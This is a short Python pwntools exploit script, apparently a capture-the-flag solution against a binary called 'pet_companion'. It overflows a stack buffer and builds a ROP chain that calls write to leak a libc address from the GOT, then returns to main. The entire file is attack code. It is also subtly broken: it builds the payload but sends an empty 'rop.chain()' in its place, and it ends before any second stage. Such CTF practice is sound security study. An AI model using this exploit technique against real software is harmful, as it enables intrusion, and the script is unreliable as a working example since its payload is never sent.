#!/usr/bin/python3
from pwn import *
offset = 72

elf = ELF('./pet_companion')
context.binary = elf
libc = ELF('glibc/libc.so.6')
rop = ROP(elf)

pop_rdi = 0x0000000000400743
pop_rsi = 0x0000000000400741


buf = b'A'* offset
buf += p64(0x00000000004004de)#ret
buf += p64(pop_rdi)
buf += p64(0x1)
buf += p64(pop_rsi)
buf += p64(elf.got['write'])
buf += p64(0x0000000000000000)
buf += p64(elf.plt['write'])
buf += p64(elf.symbols['main'])

p = elf.process()
p.recvuntil(": ")
p.send(rop.chain())

p.interactive()